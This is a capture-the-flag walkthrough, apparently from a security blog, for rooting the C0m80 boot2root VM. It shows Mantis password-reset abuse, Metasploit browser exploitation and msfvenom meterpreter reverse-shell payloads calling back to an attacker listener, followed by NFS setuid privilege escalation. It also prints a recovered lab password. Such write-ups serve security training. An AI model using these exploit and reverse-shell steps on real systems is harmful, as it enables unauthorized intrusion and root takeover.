@@ -1,0 +1,102 @@
+
+Hack the C0m80 VM (Boot2root Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as C0m80. The credit for making this vm machine goes to “3mrgnc3” and it is another boot2root challenge in which our goal is to get root to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.127 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -A -p- 192.168.1.127
+
+We find that port 80, 111, 139, 445, 2049, 20021, 37196. 40325, 41605, 49418, 58563 are open. As port 80 is running http we open the ip address in our browser.
+
+We don’t find anything on the web page so we use dirb to enumerate the directories.
+dirb http://192.168.1.127
+
+We find a link to a login page that is running mantis bug report. We find that the version is vulnerable; we can reset the password of the users with this vulnerability. You can read how to exploit this vulnerability here.
+
+Now we exploit this vulnerability to change the password of the users.
+
+We can change password of all the users present just by changing the id. After changing all the password we find that alice(id=4) is the only account with administrative privileges.
+
+Going the mails we find a page that contains a link to a backup file.
+
+We download the backup file using wget to get more information about the file.
+
+After downloading the backup file we find that it is a hexdump, we use this program here, to convert it to bin format.
+Then we use binwalk to check for for embedded file and binaries and find that there are 2 binaries.
+binwalk ftp.bin
+
+We use dd to convert the files into exe and dll, so that we can run the program.
+
+Now we run the program and find it’s a program for ftp server.
+
+We use netstat to check of ports, and found that port 20021 opened for listening on our system.
+netstat -antp
+
+We use netcat to connect to the system and find that indeed it is an application for ftpserver.
+nc localhost 20021
+ 
+
+We now reverse engineer the exe file using ollydbg for more information. And find that when it reads http: it opens the link in the the browser.
+
+We use browser autopwn auxiliary to search for vulnerabilities.
+msf > use auxiliary/server/browser_autopwn2
+msf auxiliary(server/browser_autopwn2)> set lhost 192.168.1.130
+msf auxiliary(server/browser_autopwn2)> run
+
+We find that the server can be exploited using firefox_proto_crmrequest, so we setup our listener on metasploit.
+msf > use exploit/multi/browser/firefox_proto_crmfrequest
+msf exploit(multi/browser/firefox_proto_crmfrequest) > set lhost 192.168.1.130
+msf exploit(multi/browser/firefox_proto_crmfrequest) > set lport 4444
+msf exploit(multi/browser/firefox_proto_crmfrequest) > set target 1
+msf exploit(multi/browser/firefox_proto_crmfrequest) > set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/browser/firefox_proto_crmfrequest) > run
+
+Now we copy the link given by metasploit and use it in the ftp server running on the target machine.
+
+As soon as we run the command we get our reverse shell.
+
+Going through the files we get a hint of file that contains all the passwords.
+
+So we use the search command to find all the files with that name on the server.
+search -f *PWMangr2*
+
+We download the file on our server.
+
+Now we open the file and find all the passwords.
+
+Now as the author of the machine states that we can directly access the machine, we go to the server and use the password we find for rdp.
+
+Now we have access to the machine we find a ssh private key but our nmap scan showed no ssh service running on the server so we take a look at the ssh configuration files and find that the ssh only accepts local connections on port 65122.
+
+Now we use the private key we find to login as al1ce, as it is the other account used on this server.
+
+When we try to login through ssh using the key. We use plink to connect, we get a prompt to unlock the key we use the password we find al1ce (7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286) and unlock the private key.
+plink –l al1ce localhost –I id_rsa –P 65122
+
+Now we are login as al1ce.
+
+Now the server is running nfs, so we can use this to upload setuid root binaries.
+Now we create a shell using metasploit.
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.130 lport=4444 -f elf > shell
+
+Now we setup our listener using metasploit.
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.1.130
+msf exploit(multi/handler) > set lport 4444
+msf exploit(multi/handler) > set run
+
+Now we use a script called nsfpysh to interact with nsf, we upload our shell and give him executable permission along with setuid.
+
+Now we go to the target machine and run the shell.
+
+As soon as we run the shell, we get the reverse shell as root.
+
+Now we find that we are the root user.
+
+Now we go to the root folder and find the congratulatory flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
